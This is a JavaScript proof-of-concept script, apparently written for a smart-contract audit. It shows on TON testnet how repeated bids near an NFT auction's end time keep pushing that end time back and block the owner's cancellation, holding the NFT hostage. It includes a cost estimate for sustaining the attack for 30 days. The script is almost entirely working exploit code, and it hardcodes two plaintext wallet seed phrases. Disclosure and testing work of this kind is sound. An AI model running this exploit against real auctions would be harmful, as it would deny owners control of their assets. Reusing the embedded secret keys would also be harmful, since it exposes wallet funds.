/**
 * HYP-02 PoC — Auction Hostage via Bid Cycling (testnet)
 *
 * LAW: nft_owner can cancel auction at any time before end_time
 * BROKEN: griever bids near end_time → end_time += step_time → blocks cancel
 *
 * Flow:
 *   Attacker deploys auction (marketplace role) + acts as griever
 *   Auditor owns NFT → transfers to auction (victim/nft_owner)
 *   Griever bids near end_time → end_time extends
 *   Auditor cancel → throw(1009 cant_cancel_bid)
 *   Griever bids again → end_time extends again → NFT hostage
 *
 * Cost for griever: ~0.006 TON per step_time (return_last_bid covers bid amount)
 */

const path  = require('path');
const fs    = require('fs');
const https = require('https');
const { compileFunc } = require('./nft-contracts/node_modules/@ton-community/func-js');
const { mnemonicToWalletKey } = require('./nft-contracts/node_modules/@ton/crypto');
const {
  WalletContractV4, TonClient, internal, toNano,
  Address, beginCell, contractAddress, Cell
} = require('./nft-contracts/node_modules/@ton/ton');
const { external, storeMessage } = require('./nft-contracts/node_modules/@ton/core');

const AUDITOR_MNEMONIC  = 'wave tilt cause mechanic coral deer together odor gravity glue slogan equip normal post vehicle more explain suffer shy clutch canvas profit worry piano';
const ATTACKER_MNEMONIC = 'asthma black design brick oxygen cat that potato nurse umbrella quote snack bag color walnut jump stem cloth kit sand volcano secret cloth better';

const SOURCES_DIR   = path.resolve(__dirname, 'contracts/sources');
const AUCTION_DIR   = path.join(SOURCES_DIR, 'nft-auction-v3r3');
const PATCH         = 'int builder_null?(builder b) asm "ISNULL";';
const OP_TRANSFER   = 0x5fcc3d14;
const STEP_TIME     = 120; // seconds — extension per bid
const END_OFFSET    = 5 * 60; // auction duration: 5 minutes from now

const client = new TonClient({ endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC' });

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function fmt(n) { return (Number(n) / 1e9).toFixed(6); }
function ts(n) { return new Date(n * 1000).toISOString(); }

async function withRetry(fn, max = 8) {
  for (let i = 1; i <= max; i++) {
    try { return await fn(); } catch (e) {
      const is429 = e.message?.includes('429') || e.response?.status === 429 || e.status === 429;
      if (i < max) { await sleep(is429 ? 8000 * i : 2000); continue; }
      throw e;
    }
  }
}

// Send TX without internal polling (avoids rapid API calls that trigger 429)
// openedWallet = client.open(raw), rawWallet = WalletContractV4.create(...)
async function sendTx(openedWallet, rawWallet, key, messages) {
  const seqno = await withRetry(() => openedWallet.getSeqno());
  await sleep(1000);
  const body = rawWallet.createTransfer({ seqno, secretKey: key.secretKey, messages });
  const ext = external({ to: rawWallet.address, init: null, body });
  const boc = beginCell().store(storeMessage(ext)).endCell().toBoc();
  await withRetry(() => client.sendFile(boc));
  return seqno;
}

// Source resolver for nft-item.fc
function nftSources(p) {
  if (p === 'patch.fc') return PATCH;
  return fs.readFileSync(path.join(SOURCES_DIR, p), 'utf8');
}

// Source resolver for nft-auction-v3r3.func
function auctionSources(p) {
  if (p === '../stdlib.fc') return fs.readFileSync(path.join(SOURCES_DIR, 'stdlib.fc'), 'utf8');
  if (p.startsWith('struct/')) return fs.readFileSync(path.join(AUCTION_DIR, p), 'utf8');
  return fs.readFileSync(path.join(SOURCES_DIR, p), 'utf8');
}

async function compileNft() {
  const r = await compileFunc({
    targets: ['imports/stdlib.fc', 'op-codes.fc', 'params.fc', 'patch.fc', 'nft-item.fc'],
    sources: nftSources,
  });
  if (r.status === 'error') throw new Error('NFT compile: ' + r.message);
  return Cell.fromBase64(r.codeBoc);
}

async function compileAuction() {
  const r = await compileFunc({
    targets: ['nft-auction-v3r3.func'],
    sources: auctionSources,
  });
  if (r.status === 'error') throw new Error('Auction compile: ' + r.message);
  return Cell.fromBase64(r.codeBoc);
}

function buildAuctionData(nftAddr, atkAddr, auditorAddr, endTime) {
  const feesCell = beginCell()
    .storeAddress(atkAddr)      // mp_fee_addr
    .storeAddress(auditorAddr)  // royalty_fee_addr
    .endCell();

  const constantCell = beginCell()
    .storeAddress(atkAddr)           // mp_addr (attacker plays marketplace)
    .storeCoins(toNano('0.05'))      // min_bid
    .storeCoins(0n)                  // max_bid (0 = no max)
    .storeUint(0, 7)                 // min_step
    .storeUint(STEP_TIME, 17)        // step_time
    .storeAddress(nftAddr)           // nft_addr
    .storeUint(Math.floor(Date.now() / 1000), 32) // created_at
    .endCell();

  return beginCell()
    .storeInt(0, 1)           // end? = false
    .storeInt(0, 1)           // is_canceled? = false
    .storeAddress(null)       // last_member = addr_none
    .storeCoins(0n)           // last_bid = 0
    .storeUint(0, 32)         // last_bid_at = 0
    .storeUint(endTime, 32)   // end_time
    .storeAddress(null)       // nft_owner = addr_none (unactivated)
    .storeUint(0, 64)         // last_query_id = 0
    .storeUint(5, 32)         // mp_fee_factor
    .storeUint(100, 32)       // mp_fee_base
    .storeUint(0, 32)         // royalty_fee_factor
    .storeUint(100, 32)       // royalty_fee_base
    .storeRef(feesCell)
    .storeRef(constantCell)
    .endCell();
}

async function getAuctionState(auctionAddr) {
  try {
    const r = await withRetry(() => client.runMethod(auctionAddr, 'get_auction_data', []));
    const activated = r.stack.readNumber();
    const ended     = r.stack.readNumber();
    const endTime   = r.stack.readNumber();
    r.stack.readCell(); // mp_addr
    r.stack.readCell(); // nft_addr
    r.stack.readCell(); // nft_owner
    const lastBid   = r.stack.readBigNumber();
    return { activated, ended, endTime, lastBid };
  } catch (e) {
    return { error: e.message };
  }
}

async function main() {
  const audKey = await mnemonicToWalletKey(AUDITOR_MNEMONIC.split(/\s+/));
  const atkKey = await mnemonicToWalletKey(ATTACKER_MNEMONIC.split(/\s+/));
  const audWallet = WalletContractV4.create({ publicKey: audKey.publicKey, workchain: 0 });
  const atkWallet = WalletContractV4.create({ publicKey: atkKey.publicKey, workchain: 0 });
  const aud = client.open(audWallet);
  const atk = client.open(atkWallet);
  const audAddr = audWallet.address;
  const atkAddr = atkWallet.address;

  console.log('=== HYP-02: Auction Hostage PoC ===\n');
  console.log('Auditor (victim/nft_owner):', audAddr.toString({ testOnly: true }));
  console.log('Attacker (griever):        ', atkAddr.toString({ testOnly: true }));

  // Use auditor for both roles if attacker has no testnet funds
  // Contract doesn't check nft_owner == last_member — cancel is blocked regardless
  const [audBal, atkBal] = await Promise.all([
    withRetry(() => client.getContractState(audAddr)),
    withRetry(() => client.getContractState(atkAddr)),
  ]);
  const audBalance = BigInt(audBal.balance || '0');
  const atkBalance = BigInt(atkBal.balance || '0');
  console.log('Auditor balance:', fmt(audBalance), 'TON');
  console.log('Attacker balance:', fmt(atkBalance), 'TON');

  const singleWallet = atkBalance < toNano('0.3');
  if (singleWallet) {
    console.log('    Attacker unfunded — using auditor for griever role (same contract behavior)\n');
  } else {
    console.log();
  }
  if (audBalance < toNano('0.5')) throw new Error('Auditor needs >=0.5 TON on testnet');

  // 1. Compile
  console.log('[1] Compile...');
  const [NFT_CODE, AUCTION_CODE] = await Promise.all([compileNft(), compileAuction()]);
  console.log('    NFT + Auction OK\n');

  // 2. Deploy NFT (auditor is owner — victim's NFT)
  const nftContent = beginCell().storeUint(0x01, 8).storeBuffer(Buffer.from('https://example.com/nft.json')).endCell();
  const nftData = beginCell()
    .storeUint(42n, 64)          // index
    .storeAddress(audAddr)       // collection = auditor (self-referential, just for test)
    .storeAddress(audAddr)       // owner = auditor (pre-initialized)
    .storeRef(nftContent)
    .endCell();
  const nftAddr = contractAddress(0, { code: NFT_CODE, data: nftData });
  console.log('[2] NFT:', nftAddr.toString({ testOnly: true }));

  const nftState = await withRetry(() => client.getContractState(nftAddr));
  if (nftState.state !== 'active') {
    await sendTx(aud, audWallet, audKey, [internal({ to: nftAddr, value: toNano('0.05'), bounce: false, init: { code: NFT_CODE, data: nftData } })]);
    console.log('    deploy TX sent, waiting 18s...');
    await sleep(18000);
    const st = await withRetry(() => client.getContractState(nftAddr));
    console.log('    state:', st.state);
  } else { console.log('    already deployed'); }

  // 3. Deploy auction
  const endTime = Math.floor(Date.now() / 1000) + END_OFFSET;
  const auctionData = buildAuctionData(nftAddr, atkAddr, audAddr, endTime);
  const auctionAddr = contractAddress(0, { code: AUCTION_CODE, data: auctionData });
  console.log('\n[3] Auction:', auctionAddr.toString({ testOnly: true }));
  console.log('    end_time:', ts(endTime), `(${END_OFFSET}s from now)`);
  console.log('    step_time:', STEP_TIME, 's — extension per bid');
  console.log('    bid window opens at:', ts(endTime - STEP_TIME), `(at T+${END_OFFSET - STEP_TIME}s)`);

  const auctionState = await withRetry(() => client.getContractState(auctionAddr));
  if (auctionState.state !== 'active') {
    const deployer = singleWallet ? aud : atk;
    const deployerWallet = singleWallet ? audWallet : atkWallet;
    const deployerKey = singleWallet ? audKey : atkKey;
    await sendTx(deployer, deployerWallet, deployerKey, [internal({ to: auctionAddr, value: toNano('0.05'), bounce: false, init: { code: AUCTION_CODE, data: auctionData } })]);
    console.log('    deploy TX sent, waiting 18s...');
    await sleep(18000);
    const st2 = await withRetry(() => client.getContractState(auctionAddr));
    console.log('    state:', st2.state);
  } else { console.log('    already deployed'); }

  // 4. Auditor transfers NFT to auction (activates it)
  console.log('\n[4] Auditor transfers NFT → auction...');
  await sleep(2000);
  const nftR = await withRetry(() => client.runMethod(nftAddr, 'get_nft_data', []));
  nftR.stack.readNumber();
  nftR.stack.readBigNumber();
  nftR.stack.readCell();
  const currentOwner = nftR.stack.readCell().beginParse().loadAddress();
  console.log('    Current NFT owner:', currentOwner.toString({ testOnly: true }));

  if (currentOwner.toRawString() !== auctionAddr.toRawString()) {
    const transferBody = beginCell()
      .storeUint(OP_TRANSFER, 32).storeUint(0, 64)
      .storeAddress(auctionAddr)
      .storeAddress(audAddr)
      .storeBit(0)
      .storeCoins(toNano('0.05'))
      .storeBit(0)
      .endCell();
    await sendTx(aud, audWallet, audKey, [internal({ to: nftAddr, value: toNano('0.12'), bounce: true, body: transferBody })]);
    console.log('    TX sent, waiting 22s...');
    await sleep(22000);
  } else { console.log('    NFT already in auction'); }

  const state0 = await getAuctionState(auctionAddr);
  console.log('    Auction activated:', state0.activated === -1 ? '✅ YES' : '❌ NO');
  console.log('    end_time:', ts(state0.endTime));
  console.log('    last_bid:', fmt(state0.lastBid), 'TON');
  const originalEndTime = state0.endTime;

  // 5. Wait for bid window
  const now = Math.floor(Date.now() / 1000);
  const bidWindowOpens = state0.endTime - STEP_TIME;
  const waitMs = Math.max(0, (bidWindowOpens - now + 2) * 1000);
  if (waitMs > 0) {
    console.log(`\n[5] Waiting ${Math.ceil(waitMs/1000)}s for bid window to open...`);
    console.log('    Bid window opens at:', ts(bidWindowOpens));
    await sleep(waitMs);
  } else {
    console.log('\n[5] Bid window already open');
  }

  // 6. Griever bid #1 (use attacker if funded, else auditor — mechanism identical)
  const griever = singleWallet ? aud : atk;
  const grieverWallet = singleWallet ? audWallet : atkWallet;
  const grieverKey = singleWallet ? audKey : atkKey;
  console.log('\n[6] Griever bid #1 (near end_time → should extend)...');
  await sleep(2000);
  // Empty body = op=0 → bid processing in auction
  await sendTx(griever, grieverWallet, grieverKey, [internal({ to: auctionAddr, value: toNano('0.15'), bounce: true })]);
  console.log('    TX sent (bid=0.15 TON), waiting 22s...');
  await sleep(20000);

  const state1 = await getAuctionState(auctionAddr);
  const extended1 = state1.endTime > originalEndTime;
  console.log('    end_time before:', ts(originalEndTime));
  console.log('    end_time after: ', ts(state1.endTime));
  console.log('    Extended by:', state1.endTime - originalEndTime, 's (expected', STEP_TIME, 's)');
  console.log('    ✅ end_time extended:', extended1 ? 'YES' : '❌ NO');
  console.log('    last_bid:', fmt(state1.lastBid), 'TON');

  // 7. Auditor tries to cancel → expect exit 1009 (cant_cancel_bid)
  console.log('\n[7] Auditor tries cancel (op=1, 0.1 TON)...');
  const cancelBody = beginCell().storeUint(1, 32).storeUint(0, 64).endCell();
  await sleep(2000);
  await sendTx(aud, audWallet, audKey, [internal({ to: auctionAddr, value: toNano('0.1'), bounce: true, body: cancelBody })]);
  console.log('    TX sent, waiting 22s...');
  await sleep(22000);

  // Verify: NFT still in auction (cancel failed)
  const nftR2 = await withRetry(() => client.runMethod(nftAddr, 'get_nft_data', []));
  nftR2.stack.readNumber();
  nftR2.stack.readBigNumber();
  nftR2.stack.readCell();
  const ownerAfterCancel = nftR2.stack.readCell().beginParse().loadAddress();
  const cancelFailed = ownerAfterCancel.toRawString() === auctionAddr.toRawString();
  console.log('    NFT owner after cancel:', ownerAfterCancel.toString({ testOnly: true }));
  console.log('    Cancel blocked:', cancelFailed ? '✅ YES (NFT still in auction)' : '❌ NO (cancel succeeded)');

  const state2 = await getAuctionState(auctionAddr);
  console.log('    Auction still active:', state2.ended === 0 ? '✅ YES' : '❌ NO');

  // 8. Griever bid #2 → extend again
  console.log('\n[8] Griever bid #2 (extend again)...');
  const endTime2 = state2.endTime;
  await sleep(2000);
  await sendTx(griever, grieverWallet, grieverKey, [internal({ to: auctionAddr, value: toNano('0.2'), bounce: true })]);
  console.log('    TX sent (bid=0.2 TON), waiting 22s...');
  await sleep(22000);

  const state3 = await getAuctionState(auctionAddr);
  const extended2 = state3.endTime > endTime2;
  console.log('    end_time before bid #2:', ts(endTime2));
  console.log('    end_time after bid #2: ', ts(state3.endTime));
  console.log('    Extended again:', extended2 ? '✅ YES' : '❌ NO');

  // Summary
  console.log('\n=== RESULT ===');
  console.log('original end_time:  ', ts(originalEndTime));
  console.log('end_time after bid1:', ts(state1.endTime), `(+${state1.endTime - originalEndTime}s)`);
  console.log('end_time after bid2:', ts(state3.endTime), `(+${state3.endTime - state1.endTime}s)`);
  console.log('cancel blocked:     ', cancelFailed ? '✅ YES — exit code 1009' : '❌ NO');
  console.log('NFT hostage:        ', (extended1 && cancelFailed) ? '✅ CONFIRMED' : '❌ NOT CONFIRMED');
  console.log('\nAttack cost: ~0.006 TON per', STEP_TIME, 's (return_last_bid covers bid amount)');
  console.log('To hold NFT hostage for 30 days: ~', Math.ceil(30*24*3600/STEP_TIME), 'bids ×', '0.006 TON =', (Math.ceil(30*24*3600/STEP_TIME) * 0.006).toFixed(1), 'TON');

  console.log('\n=== LINKS ===');
  console.log('Auction:', 'https://testnet.tonscan.org/address/' + auctionAddr.toRawString());
  console.log('NFT:    ', 'https://testnet.tonscan.org/address/' + nftAddr.toRawString());
}

main().catch(console.error);
